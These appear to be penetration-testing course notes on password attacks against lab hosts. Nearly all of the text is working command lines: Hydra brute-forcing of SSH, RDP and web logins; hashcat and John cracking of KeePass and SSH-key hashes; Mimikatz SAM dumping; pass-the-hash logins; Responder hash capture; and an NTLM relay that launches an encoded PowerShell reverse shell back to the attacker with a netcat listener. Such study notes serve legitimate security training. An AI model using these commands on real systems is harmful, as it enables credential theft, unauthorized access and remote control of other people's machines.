## Brute Forcing Live Passwords

>[!code]- Attack SSH with Hydra
>```bash
>kali@kali:~$ sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
>```

>[!code]- Attack RDP with Hyrda
>```bash
>kali@kali:~$ sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
>```

>[!code]- Attack a HTTP POST form with Hydra
>```bash
>kali@kali:~$ sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
>```
## Cracking Hashes
### Password Protected files

>[!code]- (Optional) Create a custom _.rule_ file
>See the wiki [here](https://hashcat.net/wiki/doku.php?id=rule_based_attack).
>
>Append  a "1" and "!" to the end of every line (**$1 $!**) and capitalises the first character (**c**):
>```bash
>kali@kali:~/passwordattacks$ echo '$1 $! c'> demo.rule
>```
>___
>
>Have multiple rulees sequentially act upon a wordlist:
>```bash
>kali@kali:~/passwordattacks$ cat demo3.rule
>$1 c $!  
>$2 c $!  
>$1 $2 $3 c $!
>```
>___
>
>Run Hashcat with the rule file:
>```bash
>kali@kali:~/passwordattacks$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
>```

>[!tip]- Precurated rules are available on Kali
>They are stored at:
>```bash
>kali@kali:~/passwordattacks$ ls -la /usr/share/hashcat/rules/
>```
#### KeePass Database Passwords

>[!code]- Format the database file
>Format the database file into a hash:
>```bash
>kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash
>```
>___
>
>Remove the prepended _Database_ from the hash (John the Ripper does this to act as an assumed username - but KeePass doesn't use usernames).

>[!code]- Use Hashcat to crack it
>Search for the appropriate hash code:
>```bash
>kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
>```
>Crack it:
>```bash
>kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -- force
>```
#### SSH Private Key Passphrase

>[!info]- Sometimes we must enter a passphrase to use a private SSH key
>
>![[Pasted image 20240530050210.png]]

>[!code]- Format the SSH private key file
>Format the private key file into a hash:
>```bash
>kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
>```
>Remove the prepended _id_rsa_ from the generated hash.

>[!code]- Crack the hash with Hashcat
>Find the appropriate hash code:
>```bash
>kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh"
>```
>___
>Crack it with a custom rule file:
>```bash
>kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule -- force
>```
>OR if an error is received (Hashcat might not support all private key files), use JtR:
>___
>Add the custom rule to JtR:
>```bash
>kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
>```
>Crack the hash with JtR:
>```bash
>kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
>```
### Windows Passwords
#### SAM Hashes

>[!info]- Info - what is the SAM and LSASS?
>Windows stores hashed user passwords in the SAM database file and caches them in the LSASS process. These are stored as NTLM hashes.

>[!warning]- Limitation - we need admin privileges and _SeDebugPrivilege_ enabled to extract LSASS or SAM hashes

>[!code]- Extract SAM hashes
>Run powershell as admin.
>___
>
>Dump the hashes with Mimikatz:
>```bash
>PS C:\tools> .\mimikatz.exe
>
># check we have the SeDebugPrivilege
>mimikatz \# privilege::debug
>
># elevate ourselves to have SYSTEM privileges
>mimikatz \# token::elevate
>
># dump the SAM
>mimikatz \# lsadump::sam
>```

>[!code]- Crack the dumped SAM hash/es
>Find which hash code to use:
>```bash
>kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"
>```
>___
>
>Crack it:
>```bash
>kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

>[!code]- (Optional) Pass the dumped hash to access a resource
>Like an SMB share:
>```bash
>kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
>```
^ee67c1

>[!code]- (Optional) Use the hash to login as that user
>- **-hashes** lets us use NTLM hashes to authenticate to the target (the format is `LMHash`:`NTHash`; since we only have the NTLM hash, we can fill the LMHash section with 32 0's)
>```bash
>kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
>```

#### Net-NTLMv2 Hashes

>[!info]- Info - What Net-NTLMv2?
>Net-NTLMv2 refers to the formally correct NTLMv2, but the former is more commonly used in the industry.
>
>Net-NTLMv2 is used to authenticate a user to a network resource when the newer, more secure _Kerberos_ protocol cannot be used.

>[!exploit]- Exploit - Net-NTLMv2 is a weak protocol; we can capture a Net-NTLMv2 hash with Responder and then easily crack it

>[!warning]- Limitation - using Responder requires access to a domain-joined machine

>[!code]- Setup Responder on Kali
>Find the interface which will receive external traffic:
>```bash
>kali@kali:~$ ip a
>```
>Run responder, select the relevant interface (it may differ to tap0):
>```bash
>kali@kali:~$ sudo responder -I tap0
>```

>[!code]- Force victim to connect to Responder on Kali (thus sharing Net-NTLMv2 hash)
>```powershell
>C:\Windows\system32>dir \\192.168.119.2\test
>```
>Responder on Kali should receive that user's Net-NTLMv2 hash.

>[!code]- Crack the capture Net-NTLMv2 hash
>Search for the correct hash code to use:
>```bash
>kali@kali:~$ hashcat --help | grep -i "ntlm"
>```
>Crack it with Hashcat:
>```bash
>kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
>```

>[!code]- Relay the hash (if it can't be cracked) to access a service on another machine
>- **-no-http-server** to disable the HTTP server since we are relaying an SMB connection
>- **-t** to set the target to FILES02
>- **-c** to set our command to execute on the target system as the relayed user; we'll use a base64-encoded PowerShell reverse shell one-liner; it includes the IP of our Kali machine.
>```bash
>kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
>```
>___
>Run a netcat listener on Kali on the port specified in the PowerShell reverse shell payload above:
>```bash
>nc -lvnp 8080
>```
>___
>
>On the victim machine as the user we want to capture the hash for, we send a SMB connection request to our Kali machine:
>```bash
>C:\Windows\system32>dir \\192.168.119.2\test
>```
>___
>
>This should cause the impacket relay server to capture the NTLM hash of the victim user and use it to execute our PowerShell command on the other victim machine.